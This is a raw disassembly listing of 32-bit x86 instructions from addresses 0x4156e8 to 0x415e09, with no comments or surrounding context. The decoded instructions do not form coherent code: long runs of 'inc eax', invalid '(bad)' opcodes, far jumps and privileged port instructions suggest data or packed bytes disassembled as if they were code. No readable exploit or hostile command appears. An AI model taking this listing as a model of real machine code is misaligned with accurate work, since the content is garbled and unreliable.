  4156e8:	repnz fld DWORD PTR [eax-0x4f]
  4156ec:	shl    BYTE PTR [ebx],0x37
  4156ef:	fisubr WORD PTR [esp+ecx*1+0x40247c40]
  4156f6:	inc    eax
  4156f7:	inc    eax
  4156f8:	inc    eax
  4156f9:	inc    eax
  4156fa:	inc    eax
  4156fb:	inc    eax
  4156fc:	inc    eax
  4156fd:	inc    eax
  4156fe:	inc    eax
  4156ff:	jns    0x415721
  415701:	sub    al,BYTE PTR ds:0xea7740ca
  415707:	arpl   WORD PTR [eax-0x8],bp
  41570a:	jae    0x415727
  41570c:	mov    bl,0x3
  41570e:	ja     0x4156c4
  415710:	gs dec dl
  415713:	bound  edx,QWORD PTR [ebx-0x57bc3fcd]
  415719:	inc    eax
  41571a:	inc    eax
  41571b:	inc    eax
  41571c:	inc    eax
  41571d:	inc    eax
  41571e:	inc    eax
  41571f:	inc    eax
  415720:	inc    eax
  415721:	add    BYTE PTR ds:0xe6b4415f,dl
  415727:	xor    BYTE PTR [ebp+0x439c41d1],dl
  41572d:	dec    esp
  41572e:	jae    0x415781
  415730:	adc    bh,BYTE PTR [ebx]
  415732:	and    BYTE PTR [eax+esi*1+0x4d],dh
  415736:	jno    0x4156fa
  415738:	mov    bh,0xc6
  41573a:	rcr    BYTE PTR [edi+0x58],1
  41573d:	jg     0x4156d1
  41573f:	cmp    BYTE PTR [eax+0x40404040],ch
  415745:	inc    eax
  415746:	inc    eax
  415747:	and    eax,0x34404040
  41574c:	pop    esp
  41574d:	fld    QWORD PTR [eax-0x7d]
  415750:	lahf   
  415751:	xchg   ecx,eax
  415752:	adc    BYTE PTR [edx+edi*8+0x40],ah
  415756:	xor    DWORD PTR [eax+0x68],eax
  415759:	inc    eax
  41575a:	inc    ecx
  41575b:	(bad)  
  41575c:	cld    
  41575d:	mov    ah,0x6c
  41575f:	sahf   
  415760:	dec    esi
  415761:	jno    0x415724
  415763:	and    eax,0x404040eb
  415768:	inc    eax
  415769:	inc    eax
  41576a:	inc    eax
  41576b:	inc    eax
  41576c:	inc    eax
  41576d:	inc    eax
  41576e:	inc    eax
  41576f:	jbe    0x41576f
  415771:	mov    esi,0x1c94409d
  415776:	out    0xfc,al
  415778:	lock mov cs,WORD PTR [edx+edi*2+0x62]
  41577d:	rcl    BYTE PTR [esi+0x61],1
  415780:	cmc    
  415781:	dec    esp
  415782:	jb     0x41576c
  415784:	adc    eax,0xeb44fa29
  415789:	xor    BYTE PTR [edi],ah
  41578b:	or     ecx,ecx
  41578d:	sbb    eax,DWORD PTR [bx+si+0x40]
  415791:	inc    eax
  415792:	inc    eax
  415793:	inc    eax
  415794:	inc    eax
  415795:	rol    DWORD PTR [eax+0x40],0x66
  415799:	mov    bl,0x9e
  41579b:	gs inc eax
  41579d:	push   esp
  41579e:	inc    ecx
  41579f:	add    eax,0xf1be7acc
  4157a4:	xor    al,0x15
  4157a6:	inc    eax
  4157a7:	inc    eax
  4157a8:	add    BYTE PTR [eax+0x40],al
  4157ab:	inc    eax
  4157ac:	inc    eax
  4157ad:	inc    eax
  4157ae:	inc    eax
  4157af:	arpl   WORD PTR [esi+0x74],bx
  4157b2:	inc    ebx
  4157b3:	inc    eax
  4157b4:	push   0xf8254357
  4157b9:	xor    eax,DWORD PTR fs:[eax+0x30]
  4157bd:	inc    edx
  4157be:	xchg   esp,eax
  4157bf:	pushf  
  4157c0:	adc    eax,0x234054e9
  4157c5:	aaa    
  4157c6:	adc    eax,0x40a844bc
  4157cb:	dec    esp
  4157cc:	dec    esi
  4157cd:	addr16 retf 
  4157cf:	add    eax,0x403169ee
  4157d4:	xchg   ebx,eax
  4157d5:	inc    eax
  4157d6:	inc    eax
  4157d7:	inc    eax
  4157d8:	inc    eax
  4157d9:	inc    eax
  4157da:	inc    eax
  4157db:	inc    eax
  4157dc:	inc    eax
  4157dd:	inc    eax
  4157de:	inc    eax
  4157df:	dec    edi
  4157e0:	test   al,0xc9
  4157e2:	cli    
  4157e3:	mov    esi,0x5b2d406c
  4157e8:	inc    esi
  4157e9:	mov    esi,?
  4157eb:	bound  ebx,QWORD PTR [ebx-0x40bfb1c0]
  4157f1:	add    eax,0x58f3500d
  4157f6:	lahf   
  4157f7:	sub    DWORD PTR [ecx*8+0x40f1f816],esi
  4157fe:	dec    esi
  4157ff:	sub    esp,DWORD PTR [edx-0x62]
  415802:	jecxz  0x415829
  415804:	dec    edi
  415805:	inc    eax
  415806:	lahf   
  415807:	inc    eax
  415808:	inc    eax
  415809:	inc    eax
  41580a:	inc    eax
  41580b:	inc    eax
  41580c:	inc    eax
  41580d:	int3   
  41580e:	jne    0x415850
  415810:	inc    ecx
  415811:	retf   
  415812:	inc    esp
  415813:	pop    esp
  415814:	or     DWORD PTR [edx],ebp
  415816:	inc    eax
  415817:	jae    0x415806
  415819:	xchg   esp,eax
  41581a:	mov    bl,0xf9
  41581c:	fld    DWORD PTR [eax+0x0]
  41581f:	rol    DWORD PTR [eax+0x40],0x40
  415823:	inc    eax
  415824:	add    BYTE PTR [eax+0x2e],al
  415827:	push   esp
  415828:	ja     0x415875
  41582a:	add    eax,0x434cf4cc
  41582f:	inc    eax
  415830:	dec    edi
  415831:	inc    eax
  415832:	leave  
  415833:	pushf  
  415834:	add    eax,0xbf403334
  415839:	jp     0x41587c
  41583b:	or     eax,0x405000f2
  415840:	inc    eax
  415841:	inc    eax
  415842:	inc    eax
  415843:	inc    eax
  415844:	inc    eax
  415845:	inc    eax
  415846:	inc    eax
  415847:	inc    DWORD PTR [eax+0x40]
  41584a:	push   edi
  41584b:	aaa    
  41584c:	or     BYTE PTR [ecx+0x53],al
  41584f:	mov    al,ds:0x48b35044
  415854:	(bad)
  415858:	push   ecx
  415859:	inc    eax
  41585a:	pop    eax
  41585b:	ins    DWORD PTR es:[edi],dx
  41585c:	xlat   BYTE PTR ds:[ebx]
  41585d:	je     0x415851
  41585f:	push   eax
  415860:	imul   eax,DWORD PTR [eax+0x31],0x40
  415864:	inc    eax
  415865:	inc    eax
  415866:	inc    eax
  415867:	inc    eax
  415868:	inc    eax
  415869:	inc    eax
  41586a:	inc    eax
  41586b:	inc    eax
  41586c:	inc    eax
  41586d:	inc    eax
  41586e:	xchg   ebp,eax
  41586f:	stc    
  415870:	adc    eax,0x4040ad05
  415875:	xor    ch,BYTE PTR [eax-0x47343666]
  41587b:	dec    esp
  41587c:	push   eax
  41587d:	dec    ebp
  41587e:	adc    BYTE PTR [ebx+0x26],al
  415881:	dec    esp
  415882:	inc    ebx
  415883:	inc    eax
  415884:	jns    0x4158c6
  415886:	dec    eax
  415887:	jmp    0x4158ca
  415889:	inc    esi
  41588a:	rol    BYTE PTR [eax-0x42],cl
  41588d:	and    al,0x40
  41588f:	inc    eax
  415890:	inc    eax
  415891:	inc    eax
  415892:	inc    eax
  415893:	inc    eax
  415894:	inc    eax
  415895:	inc    eax
  415896:	add    BYTE PTR [edx+0x76],al
  415899:	adc    DWORD PTR [edi-0x7c],eax
  41589c:	inc    eax
  41589d:	push   edi
  41589e:	loop   0x415861
  4158a0:	clc    
  4158a1:	sub    al,bl
  4158a3:	or     DWORD PTR [eax+0x31],0xd
  4158a7:	mov    WORD PTR [eax+0x40eca9fa],ds
  4158ad:	push   edi
  4158ae:	inc    eax
  4158af:	inc    eax
  4158b0:	inc    eax
  4158b1:	inc    eax
  4158b2:	inc    eax
  4158b3:	inc    eax
  4158b4:	and    eax,0x42404040
  4158b9:	fs adc eax,0x40d747f0
  4158bf:	mov    ebx,0xd411522
  4158c4:	fld    DWORD PTR [ecx+0x40]
  4158c7:	sub    dh,BYTE PTR [edi-0x8]
  4158ca:	inc    edx
  4158cb:	inc    esp
  4158cc:	adc    DWORD PTR [ebx+0x44],eax
  4158cf:	xor    DWORD PTR [edx+0x62],eax
  4158d2:	in     al,0xcf
  4158d4:	mov    al,0x30
  4158d6:	inc    eax
  4158d7:	inc    esp
  4158d8:	and    eax,0x40404050
  4158dd:	inc    eax
  4158de:	inc    eax
  4158df:	inc    eax
  4158e0:	inc    eax
  4158e1:	inc    eax
  4158e2:	inc    eax
  4158e3:	inc    eax
  4158e4:	cli    
  4158e5:	and    eax,0xb0404cd2
  4158ea:	das    
  4158eb:	jb     0x415883
  4158ed:	stc    
  4158ee:	mov    ds:0x412c4040,al
  4158f3:	and    DWORD PTR [edi-0x12],ebx
  4158f6:	bound  esi,QWORD PTR [ecx]
  4158f8:	inc    eax
  4158f9:	sub    ebx,esp
  4158fb:	arpl   WORD PTR [esi+0x4040401b],di
  415901:	inc    eax
  415902:	inc    eax
  415903:	inc    eax
  415904:	rol    DWORD PTR [eax+0x40],0x41
  415908:	ins    BYTE PTR es:[edi],dx
  415909:	inc    eax
  41590a:	repnz inc eax
  41590c:	or     DWORD PTR [edi+eax*1+0x7a405554],edx
  415913:	aaa    
  415914:	test   al,0x5
  415916:	pop    esi
  415917:	addr16 inc edi
  415919:	inc    eax
  41591a:	add    esi,DWORD PTR [edi+0x6f]
  41591d:	inc    edi
  41591e:	in     al,dx
  41591f:	into   
  415920:	lds    ebp,FWORD PTR [ecx-0x6f]
  415923:	inc    eax
  415924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415925:	retf   0x4115
  415928:	std    
  415929:	adc    eax,0x3763edb5
  41592e:	inc    eax
  41592f:	inc    eax
  415930:	add    BYTE PTR [eax+0x40],al
  415933:	inc    eax
  415934:	inc    eax
  415935:	inc    eax
  415936:	inc    eax
  415937:	icebp  
  415938:	push   ebp
  415939:	daa    
  41593a:	inc    esp
  41593b:	imul   esp,DWORD PTR [eax+edi*8],0xfffffff8
  41593f:	ret    0x756b
  415942:	mov    edi,0x920d69d1
  415947:	push   esp
  415948:	aam    0x83
  41594a:	inc    esp
  41594b:	addr16 inc eax
  41594d:	int    0x63
  41594f:	cli    
  415950:	fadd   DWORD PTR [ecx-0x41]
  415953:	push   ecx
  415954:	xor    eax,0x4040ab10
  415959:	inc    eax
  41595a:	inc    eax
  41595b:	inc    eax
  41595c:	inc    eax
  41595d:	inc    eax
  41595e:	inc    eax
  41595f:	inc    eax
  415960:	inc    eax
  415961:	jmp    0x8c40:0x2a454364
  415968:	nop
  415969:	or     eax,0x7d343052
  41596e:	das    
  41596f:	add    eax,0x4849c963
  415974:	dec    edi
  415975:	push   ebp
  415976:	imul   ecx,ebp,0x402526a9
  41597c:	xor    al,0x40
  41597e:	inc    eax
  41597f:	inc    eax
  415980:	inc    eax
  415981:	inc    eax
  415982:	inc    eax
  415983:	int3   
  415984:	jne    0x4159c6
  415986:	inc    DWORD PTR [edx+0x12]
  415989:	mov    es,WORD PTR [edx+0x50]
  41598c:	xor    DWORD PTR [edi+ecx*2],esp
  41598f:	sub    ebx,DWORD PTR [eax+0x6c403149]
  415995:	adc    esp,edx
  415997:	jno    0x4159ae
  415999:	mov    cl,0x18
  41599b:	push   0x72
  41599d:	shr    DWORD PTR [ecx+0x40],0xcd
  4159a1:	inc    eax
  4159a2:	add    cl,al
  4159a4:	inc    eax
  4159a5:	inc    eax
  4159a6:	inc    eax
  4159a7:	inc    eax
  4159a8:	add    BYTE PTR [eax-0x74],al
  4159ab:	pop    edx
  4159ac:	lds    edi,FWORD PTR [ecx-0xd]
  4159af:	imul   eax,DWORD PTR ds:0x2cf91548,0xfffffffd
  4159b6:	arpl   WORD PTR [ebx],si
  4159b8:	and    DWORD PTR [esi+0x4b],edi
  4159bb:	call   0x41b1a323
  4159c0:	dec    ecx
  4159c1:	sbb    al,0xfa
  4159c3:	add    eax,0x91139098
  4159c8:	inc    eax
  4159c9:	push   ebp
  4159ca:	cli    
  4159cb:	jmp    0x4040:0x40f18aa8
  4159d2:	inc    eax
  4159d3:	inc    eax
  4159d4:	inc    eax
  4159d5:	inc    eax
  4159d6:	inc    eax
  4159d7:	inc    DWORD PTR [eax-0x45]
  4159da:	pusha  
  4159db:	ja     0x4159fa
  4159dd:	jg     0x415a4a
  4159df:	inc    ebx
  4159e0:	push   ds
  4159e1:	xlat   BYTE PTR ds:[ebx]
  4159e2:	imul   ebp,DWORD PTR [eax],0x3f
  4159e5:	push   ebx
  4159e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159e7:	xor    ebx,DWORD PTR [ebx]
  4159e9:	repz inc esp
  4159eb:	push   ebp
  4159ec:	adc    bl,BYTE PTR [edx+eiz*2]
  4159ef:	inc    esp
  4159f0:	pop    ecx
  4159f1:	(bad)  
  4159f2:	and    cl,BYTE PTR [eax+0x4040f862]
  4159f8:	inc    eax
  4159f9:	inc    eax
  4159fa:	inc    eax
  4159fb:	inc    eax
  4159fc:	inc    eax
  4159fd:	inc    eax
  4159fe:	inc    eax
  4159ff:	inc    eax
  415a00:	or     eax,DWORD PTR [eax+0x7c]
  415a03:	adc    DWORD PTR [edi+0xd],esi
  415a06:	mov    al,ds:0x3531f333
  415a0b:	jb     0x415a4d
  415a0d:	cmp    al,0xd
  415a0f:	(bad)  
  415a10:	sbb    eax,0x6eb3516c
  415a15:	ds int 0x6f
  415a18:	gs (bad) 
  415a1b:	pop    ebx
  415a1c:	xchg   BYTE PTR [bp+si+0x5028],dh
  415a21:	inc    ebx
  415a22:	jge    0x415a97
  415a24:	inc    edx
  415a25:	add    eax,0x40404040
  415a2a:	inc    eax
  415a2b:	inc    eax
  415a2c:	inc    eax
  415a2d:	inc    eax
  415a2e:	add    BYTE PTR [ecx+0x54],al
  415a31:	or     eax,0x154240d1
  415a36:	inc    edi
  415a37:	imul   ecx,DWORD PTR [esi-0x35],0xffffffd9
  415a3b:	or     al,0x10
  415a3d:	cmp    eax,0x163c08da
  415a42:	or     al,0x45
  415a44:	push   0x67637e59
  415a49:	stos   DWORD PTR es:[edi],eax
  415a4a:	inc    eax
  415a4b:	inc    eax
  415a4c:	inc    eax
  415a4d:	inc    eax
  415a4e:	inc    eax
  415a4f:	inc    eax
  415a50:	and    eax,0xc1404040
  415a55:	rol    BYTE PTR [eax+0x40],1
  415a58:	clc    
  415a59:	mov    al,0x18
  415a5b:	mov    eax,0x7b6015eb
  415a60:	test   BYTE PTR ds:0x50280551,dl
  415a66:	mov    eax,0xdd416940
  415a6b:	leave  
  415a6c:	inc    eax
  415a6d:	ror    DWORD PTR [ebp+0x2e],1
  415a70:	or     eax,edx
  415a72:	inc    ebp
  415a73:	dec    esp
  415a74:	inc    eax
  415a75:	inc    eax
  415a76:	pop    ebp
  415a77:	inc    eax
  415a78:	inc    eax
  415a79:	inc    eax
  415a7a:	inc    eax
  415a7b:	inc    eax
  415a7c:	inc    eax
  415a7d:	inc    eax
  415a7e:	inc    eax
  415a7f:	inc    eax
  415a80:	inc    eax
  415a81:	inc    edx
  415a82:	data16 jb 0x415ad1
  415a85:	inc    esi
  415a86:	inc    ecx
  415a87:	mov    al,0x4d
  415a89:	inc    eax
  415a8a:	cmp    dl,0x78
  415a8d:	cmp    al,0x40
  415a8f:	inc    eax
  415a90:	inc    eax
  415a91:	inc    eax
  415a92:	inc    eax
  415a93:	inc    eax
  415a94:	rol    DWORD PTR [eax+0x40],0x40
  415a98:	retf   
  415a99:	pop    edi
  415a9a:	and    eax,0xd043ae73
  415a9f:	inc    esi
  415aa0:	add    bl,BYTE PTR ds:0xc80dc94a
  415aa6:	xchg   esp,eax
  415aa7:	inc    eax
  415aa8:	dec    esi
  415aa9:	test   DWORD PTR [eax+0x66],0x30a81f41
  415ab0:	rcl    BYTE PTR [esi+0x5],cl
  415ab3:	add    BYTE PTR [edi+0x28],0x15
  415ab7:	ins    BYTE PTR es:[edi],dx
  415ab8:	sbb    eax,0xd869275f
  415abd:	inc    eax
  415abe:	inc    eax
  415abf:	add    BYTE PTR [eax+0x40],al
  415ac2:	inc    eax
  415ac3:	inc    eax
  415ac4:	inc    eax
  415ac5:	inc    eax
  415ac6:	inc    ebx
  415ac7:	ds sub al,0x40
  415aca:	dec    esi
  415acb:	inc    eax
  415acc:	cmc    
  415acd:	jae    0x415a97
  415acf:	push   0x7a351443
  415ad4:	data16 stc 
  415ad6:	add    eax,0x4055d140
  415adb:	inc    eax
  415adc:	(bad)  
  415add:	lods   al,BYTE PTR ds:[esi]
  415ade:	test   al,0x66
  415ae0:	cmp    eax,0xa13231d0
  415ae5:	add    eax,0x40cf5968
  415aea:	inc    eax
  415aeb:	inc    eax
  415aec:	inc    eax
  415aed:	inc    eax
  415aee:	inc    eax
  415aef:	inc    eax
  415af0:	inc    eax
  415af1:	inc    eax
  415af2:	inc    eax
  415af3:	adc    eax,0x411d4627
  415af8:	mov    esi,0xdd5642f3
  415afd:	inc    eax
  415afe:	push   di
  415b00:	bound  ecx,QWORD PTR [ebp+0x67]
  415b03:	push   eax
  415b04:	inc    ebx
  415b05:	sub    al,0x40
  415b07:	inc    eax
  415b08:	inc    eax
  415b09:	inc    eax
  415b0a:	inc    eax
  415b0b:	inc    eax
  415b0c:	int3   
  415b0d:	jne    0x415b4f
  415b0f:	cld    
  415b10:	in     al,dx
  415b11:	inc    esp
  415b12:	bound  ebp,QWORD PTR [eax]
  415b14:	add    eax,0xf86c32bf
  415b19:	sub    bh,BYTE PTR [eax+0x40bf0642]
  415b1f:	xchg   ebp,eax
  415b20:	stos   BYTE PTR es:[edi],al
  415b21:	inc    edi
  415b22:	fadd   QWORD PTR [ecx+eax*2]
  415b25:	daa    
  415b26:	inc    ebp
  415b27:	adc    ax,0x4c3e
  415b2b:	jo     0x415b7f
  415b2d:	mov    edi,0x6257fa23
  415b32:	hlt    
  415b33:	inc    eax
  415b34:	add    cl,al
  415b36:	inc    eax
  415b37:	inc    eax
  415b38:	inc    eax
  415b39:	inc    eax
  415b3a:	add    BYTE PTR [eax+0x62],al
  415b3d:	sbb    edi,DWORD PTR [esi+eax*2+0x6b]
  415b41:	out    dx,eax
  415b42:	and    DWORD PTR [ecx+0x40],ebx
  415b45:	mov    esi,0x40bd40ff
  415b4a:	inc    eax
  415b4b:	inc    eax
  415b4c:	inc    eax
  415b4d:	inc    eax
  415b4e:	inc    eax
  415b4f:	inc    eax
  415b50:	inc    eax
  415b51:	inc    DWORD PTR [eax-0x6]
  415b54:	shl    DWORD PTR [edx+0x30],1
  415b57:	mov    edi,0xa8663b3f
  415b5c:	sbb    eax,0x5f406ce4
  415b61:	inc    eax
  415b62:	clc    
  415b63:	or     eax,0x40c93034
  415b68:	cmp    esp,DWORD PTR [eax+0x40]
  415b6b:	inc    eax
  415b6c:	inc    eax
  415b6d:	inc    eax
  415b6e:	inc    eax
  415b6f:	inc    eax
  415b70:	inc    eax
  415b71:	inc    eax
  415b72:	inc    eax
  415b73:	inc    eax
  415b74:	adc    eax,0x47dfd057
  415b79:	inc    eax
  415b7a:	pop    edi
  415b7b:	inc    eax
  415b7c:	cmp    edi,ebp
  415b7e:	inc    ebx
  415b7f:	lds    eax,FWORD PTR fs:[eax]
  415b82:	sub    BYTE PTR [ecx],ah
  415b84:	fdivp  st(1),st
  415b86:	sub    DWORD PTR [ebp+0x59],edx
  415b89:	fcomp  QWORD PTR [edi]
  415b8b:	bound  edi,QWORD PTR [esi+eiz*4+0x20]
  415b8f:	bound  ecx,QWORD PTR [ebx]
  415b91:	add    al,0x40
  415b93:	inc    eax
  415b94:	inc    eax
  415b95:	inc    eax
  415b96:	inc    eax
  415b97:	inc    eax
  415b98:	inc    eax
  415b99:	inc    eax
  415b9a:	add    BYTE PTR [ebp+0x48],cl
  415b9d:	cli    
  415b9e:	pop    ecx
  415b9f:	test   al,0x5a
  415ba1:	inc    esi
  415ba2:	repnz adc eax,DWORD PTR [ecx]
  415ba5:	inc    eax
  415ba6:	mov    dh,0x6f
  415ba8:	cld    
  415ba9:	adc    ecx,DWORD PTR [edi+0x40404040]
  415baf:	inc    eax
  415bb0:	inc    eax
  415bb1:	and    eax,0x1404040
  415bb6:	cmp    DWORD PTR [eax-0x5c],eax
  415bb9:	mov    dl,0x90
  415bbb:	inc    ecx
  415bbc:	out    dx,al
  415bbd:	jae    0x415c1d
  415bbf:	inc    ecx
  415bc0:	adc    eax,0x40473462
  415bc5:	inc    eax
  415bc6:	inc    eax
  415bc7:	inc    eax
  415bc8:	inc    eax
  415bc9:	inc    eax
  415bca:	inc    eax
  415bcb:	inc    eax
  415bcc:	inc    eax
  415bcd:	inc    eax
  415bce:	inc    eax
  415bcf:	leave  
  415bd0:	inc    eax
  415bd1:	popa   
  415bd2:	push   edi
  415bd3:	inc    ecx
  415bd4:	leave  
  415bd5:	and    al,0x65
  415bd7:	mov    esi,0x9ee4333
  415bdc:	jmp    0x415b96
  415bde:	dec    ebp
  415bdf:	mov    edi,0xd5fa992a
  415be4:	add    al,0x40
  415be6:	adc    cl,cl
  415be8:	inc    ebx
  415be9:	ins    BYTE PTR es:[edi],dx
  415bea:	inc    eax
  415beb:	inc    eax
  415bec:	inc    eax
  415bed:	inc    eax
  415bee:	inc    eax
  415bef:	inc    eax
  415bf0:	rol    DWORD PTR [eax+0x40],0xa2
  415bf4:	jge    0x415c58
  415bf6:	xor    DWORD PTR [ecx-0x41],eax
  415bf9:	int3   
  415bfa:	bound  ecx,QWORD PTR ds:0x46c624c
  415c00:	adc    ecx,DWORD PTR [edx-0x2e]
  415c03:	push   ebp
  415c04:	frstor [esi+eiz*8+0x42]
  415c08:	adc    DWORD PTR [edi+0x18],ebp
  415c0b:	out    0xa8,eax
  415c0d:	bound  ebp,QWORD PTR [ecx]
  415c0f:	rcr    bl,1
  415c11:	les    esp,FWORD PTR [ebx-0x7]
  415c14:	xor    al,0x57
  415c16:	loope  0x415c1b
  415c18:	inc    eax
  415c19:	inc    eax
  415c1a:	imul   eax,DWORD PTR [eax+0x40],0x0
  415c1e:	inc    eax
  415c1f:	inc    eax
  415c20:	inc    eax
  415c21:	inc    eax
  415c22:	inc    eax
  415c23:	inc    eax
  415c24:	mov    al,ds:0x4de090c0
  415c29:	push   eax
  415c2a:	sub    al,0xa9
  415c2c:	add    eax,0xf5695b41
  415c31:	ja     0x415c4d
  415c33:	ss dec esi
  415c35:	cmp    eax,0x11885288
  415c3a:	adc    al,0xda
  415c3c:	iret   
  415c3d:	cmp    esp,DWORD PTR [ebx+0x28]
  415c40:	neg    ebx
  415c42:	inc    eax
  415c43:	push   ebx
  415c44:	sbb    al,0x40
  415c46:	inc    eax
  415c47:	inc    eax
  415c48:	inc    eax
  415c49:	inc    eax
  415c4a:	inc    eax
  415c4b:	inc    eax
  415c4c:	inc    eax
  415c4d:	inc    eax
  415c4e:	inc    eax
  415c4f:	test   al,0x78
  415c51:	inc    ecx
  415c52:	je     0x415c98
  415c54:	and    ecx,esi
  415c56:	clc    
  415c57:	bound  ebx,QWORD PTR cs:[edi-0x17bfe2a9]
  415c5e:	inc    eax
  415c5f:	inc    eax
  415c60:	inc    eax
  415c61:	inc    eax
  415c62:	inc    eax
  415c63:	inc    eax
  415c64:	int3   
  415c65:	jne    0x415ca7
  415c67:	pop    ds
  415c68:	mov    ch,BYTE PTR [ecx+0x1712233c]
  415c6e:	bound  esi,QWORD PTR ds:0x1340b862
  415c74:	mov    ch,0x40
  415c76:	pushf  
  415c77:	add    BYTE PTR [ecx+0x5d],0x30
  415c7b:	dec    ebx
  415c7c:	imul   DWORD PTR [edi]
  415c7e:	or     eax,0x40c10040
  415c83:	inc    eax
  415c84:	inc    eax
  415c85:	inc    eax
  415c86:	add    BYTE PTR [eax-0x3b],al
  415c89:	sub    bh,BYTE PTR [esi+0x6c]
  415c8c:	mov    ch,0x45
  415c8e:	jl     0x415c5b
  415c90:	inc    eax
  415c91:	push   esi
  415c92:	push   0x40d71f83
  415c97:	pop    esp
  415c98:	inc    eax
  415c99:	es jg  0x415cdf
  415c9c:	inc    edx
  415c9d:	into   
  415c9e:	xor    BYTE PTR [eax+0x40],al
  415ca1:	inc    eax
  415ca2:	inc    eax
  415ca3:	inc    eax
  415ca4:	inc    eax
  415ca5:	inc    eax
  415ca6:	inc    eax
  415ca7:	inc    DWORD PTR [eax+0x41]
  415caa:	push   ebx
  415cab:	dec    edx
  415cac:	cld    
  415cad:	sar    DWORD PTR [ebx],1
  415caf:	jg     0x415c73
  415cb1:	rcr    DWORD PTR [ecx+0x3c],0x69
  415cb5:	out    0x42,al
  415cb7:	or     al,0x40
  415cb9:	aam    0xa8
  415cbb:	retf   
  415cbc:	push   eax
  415cbd:	push   es
  415cbe:	aas    
  415cbf:	lock cmp DWORD PTR [ebx+0x48],edx
  415cc3:	jae    0x415d05
  415cc5:	inc    eax
  415cc6:	inc    eax
  415cc7:	inc    eax
  415cc8:	inc    eax
  415cc9:	inc    eax
  415cca:	inc    eax
  415ccb:	inc    eax
  415ccc:	inc    eax
  415ccd:	inc    eax
  415cce:	push   edi
  415ccf:	test   DWORD PTR [ecx+0x79],0x91d42240
  415cd6:	ffree  st(2)
  415cd8:	xor    eax,DWORD PTR [eax+0x32]
  415cdb:	pushf  
  415cdc:	push   esp
  415cdd:	bound  eax,QWORD PTR [ebx+0x41]
  415ce0:	inc    ebx
  415ce1:	ja     0x415d23
  415ce3:	push   edx
  415ce4:	fs inc eax
  415ce6:	inc    eax
  415ce7:	inc    eax
  415ce8:	inc    eax
  415ce9:	inc    eax
  415cea:	inc    eax
  415ceb:	inc    eax
  415cec:	inc    eax
  415ced:	add    ch,cl
  415cef:	pusha  
  415cf0:	inc    edi
  415cf1:	xor    ebp,ecx
  415cf3:	add    ecx,ebx
  415cf5:	addr16 inc eax
  415cf7:	ins    DWORD PTR es:[edi],dx
  415cf8:	and    al,0xe5
  415cfa:	mov    ecx,0x2a8c1f04
  415cff:	inc    ebp
  415d00:	mov    al,0x19
  415d02:	adc    BYTE PTR [eax+0x5d],al
  415d05:	bound  edx,QWORD PTR [esp+ebp*1+0x40]
  415d09:	push   edi
  415d0a:	pop    ecx
  415d0b:	and    eax,0x802a4a62
  415d10:	xor    DWORD PTR [ebx+0x40404040],edx
  415d16:	inc    eax
  415d17:	inc    eax
  415d18:	and    eax,0xa3404040
  415d1d:	inc    edx
  415d1e:	inc    ebp
  415d1f:	test   eax,0x586c5929
  415d24:	adc    BYTE PTR [eax+0x24],al
  415d27:	mov    ah,0x43
  415d29:	and    DWORD PTR [eax+0x152c5fb5],0x473e6305
  415d33:	jns    0x415d45
  415d35:	pop    eax
  415d36:	push   ebp
  415d37:	retf   
  415d38:	je     0x415cf3
  415d3a:	lds    edx,FWORD PTR [ebx+0x5f]
  415d3d:	inc    eax
  415d3e:	cmc    
  415d3f:	dec    eax
  415d40:	inc    eax
  415d41:	inc    eax
  415d42:	inc    eax
  415d43:	inc    eax
  415d44:	inc    eax
  415d45:	inc    eax
  415d46:	inc    eax
  415d47:	inc    eax
  415d48:	inc    eax
  415d49:	inc    eax
  415d4a:	arpl   WORD PTR [ecx-0x59],bx
  415d4d:	mov    edi,0x43562944
  415d52:	shl    DWORD PTR [edx],1
  415d54:	test   DWORD PTR [ecx+0x7f],ebx
  415d57:	sub    BYTE PTR [ebx+edx*2+0x53efb0dc],ch
  415d5e:	adc    al,BYTE PTR [eax+0x55]
  415d61:	fcom   QWORD PTR [ebp+0x15]
  415d64:	mov    ds:0x40404040,eax
  415d69:	inc    eax
  415d6a:	inc    eax
  415d6b:	rol    DWORD PTR [eax+0x40],0x3e
  415d6f:	adc    edi,DWORD PTR [ebp+esi*8+0x7]
  415d73:	nop
  415d74:	jg     0x415d9e
  415d76:	je     0x415df1
  415d78:	inc    eax
  415d79:	push   ebx
  415d7a:	test   BYTE PTR [eax+0x2e],bl
  415d7d:	inc    edx
  415d7e:	and    edx,edx
  415d80:	dec    edx
  415d81:	int    0x74
  415d83:	and    DWORD PTR [esp+eax*1-0x36],esp
  415d87:	sub    al,0x40
  415d89:	inc    eax
  415d8a:	add    BYTE PTR [eax+0x40],al
  415d8d:	inc    eax
  415d8e:	inc    eax
  415d8f:	inc    eax
  415d90:	inc    eax
  415d91:	push   0x7add7750
  415d96:	push   esp
  415d97:	repz inc edi
  415d99:	inc    eax
  415d9a:	or     eax,0x622c423d
  415d9f:	inc    edi
  415da0:	repnz inc eax
  415da2:	inc    eax
  415da3:	inc    eax
  415da4:	inc    eax
  415da5:	inc    eax
  415da6:	inc    eax
  415da7:	inc    eax
  415da8:	inc    eax
  415da9:	inc    eax
  415daa:	inc    eax
  415dab:	dec    ebp
  415dac:	retf   
  415dad:	data16 mov al,0x40
  415db0:	inc    ebx
  415db1:	fnstsw WORD PTR [edx+0x766fb040]
  415db7:	mov    eax,0x40ba04dc
  415dbc:	inc    eax
  415dbd:	inc    eax
  415dbe:	inc    eax
  415dbf:	inc    eax
  415dc0:	inc    eax
  415dc1:	int3   
  415dc2:	jne    0x415e04
  415dc4:	jle    0x415e08
  415dc6:	xor    BYTE PTR [edi],bh
  415dc8:	cmp    eax,0x405d976b
  415dcd:	push   ebp
  415dce:	fs aam 0xc3
  415dd1:	scas   al,BYTE PTR es:[edi]
  415dd2:	push   esi
  415dd3:	sbb    DWORD PTR [esp+esi*8],ebp
  415dd6:	les    edx,FWORD PTR [edx-0x48]
  415dd9:	mov    ebp,0x554062f3
  415dde:	cmp    al,0xb9
  415de0:	inc    edx
  415de1:	fsubr  QWORD PTR [ebx+0x70]
  415de4:	sub    eax,0x7ea8106b
  415de9:	jmp    0x4040:0xc1004032
  415df0:	inc    eax
  415df1:	inc    eax
  415df2:	add    BYTE PTR [eax+0x32],al
  415df5:	inc    eax
  415df6:	push   esp
  415df7:	aam    0x55
  415df9:	cmp    al,0x2f
  415dfb:	lahf   
  415dfc:	or     DWORD PTR [eax-0x3b],eax
  415dff:	add    eax,0x40400b59
  415e04:	inc    eax
  415e05:	inc    eax
  415e06:	inc    eax
  415e07:	inc    eax
  415e08:	inc    eax
  415e09:	inc    eax
